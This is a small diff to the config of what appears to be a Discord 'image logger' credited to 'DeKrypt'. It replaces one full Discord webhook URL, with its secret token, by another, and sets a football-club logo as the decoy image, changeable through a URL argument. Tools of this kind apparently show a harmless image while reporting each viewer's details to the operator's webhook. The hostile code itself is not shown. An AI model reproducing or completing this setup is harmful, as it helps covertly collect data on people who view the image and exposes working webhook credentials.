@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1335206157966639156/yiXYOgnHFK9tURatA4qjdd3Jy9TT1XHsa6rGaqhXzp5OKAAp4CAeldMcaG5xh0r0Fi5k",
+    "webhook": "https://discord.com/api/webhooks/1335208710703808532/bbE1BnV7dQE48XGJrKBCmO7oI_Xar7pOJ0c93mfJolHXbsRrbMNTXDyTt8s2hWH68Bet",
     "image": "https://1000logos.net/wp-content/uploads/2022/03/Panathinaikos-Logo.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
